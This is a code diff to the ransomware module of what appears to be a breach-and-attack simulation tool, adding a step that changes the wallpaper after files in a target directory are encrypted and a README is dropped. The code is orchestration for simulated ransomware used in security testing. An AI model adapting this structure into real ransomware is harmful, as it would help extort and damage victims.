@@ -10,9 +10,14 @@ from common.event_queue import IAgentEventPublisher
 from common.tags import DATA_ENCRYPTED_FOR_IMPACT_T1486_TAG
 from infection_monkey.utils.threading import interruptible_function, interruptible_iter
 
-from .consts import README_FILE_NAME, README_SRC
+from .consts import IMAGE_FILE_NAME, IMAGE_SRC, README_FILE_NAME, README_SRC
 from .internal_ransomware_options import InternalRansomwareOptions
-from .typedef import FileEncryptorCallable, FileSelectorCallable, ReadmeDropperCallable
+from .typedef import (
+    FileEncryptorCallable,
+    FileSelectorCallable,
+    ImageDropperCallable,
+    ReadmeDropperCallable,
+)
 
 logger = logging.getLogger(__name__)
 
@@ -27,6 +32,7 @@ class Ransomware:
         encrypt_file: FileEncryptorCallable,
         select_files: FileSelectorCallable,
         leave_readme: ReadmeDropperCallable,
+        change_wallpaper: ImageDropperCallable,
         agent_event_publisher: IAgentEventPublisher,
         agent_id: AgentID,
     ):
@@ -35,12 +41,18 @@ class Ransomware:
         self._encrypt_file = encrypt_file
         self._select_files = select_files
         self._leave_readme = leave_readme
+        self.change_wallpaper = change_wallpaper
         self._agent_event_publisher = agent_event_publisher
         self._agent_id = agent_id
 
         self._target_directory = self._config.target_directory
         self._readme_file_path = (
             self._target_directory / README_FILE_NAME  # type: ignore
+            if self._target_directory
+            else None
+        )
+        self._image_file_path = (
+            self._target_directory / IMAGE_FILE_NAME  # type: ignore
             if self._target_directory
             else None
         )
@@ -72,6 +84,9 @@ class Ransomware:
 
         if self._config.leave_readme:
             self._leave_readme_in_target_directory(interrupt=interrupt)
+
+        if self._config.change_wallpaper:
+            self._leave_wallpaper_in_target_directory(interrupt=interrupt)
 
     def _find_files(self) -> Iterable[Path]:
         logger.info(f"Collecting files in {self._target_directory}")
@@ -109,3 +124,10 @@ class Ransomware:
             self._leave_readme(README_SRC, self._readme_file_path)  # type: ignore
         except Exception as err:
             logger.warning(f"An error occurred while attempting to leave a README.txt file: {err}")
+
+    @interruptible_function(msg="Received a stop signal, skipping changing the wallpaper")
+    def _leave_wallpaper_in_target_directory(self, *, interrupt: threading.Event):
+        try:
+            self.change_wallpaper(IMAGE_SRC, self._image_file_path)
+        except Exception as err:
+            logger.warning(f"An error occurred while attempting to change the Wallpaper: {err}")
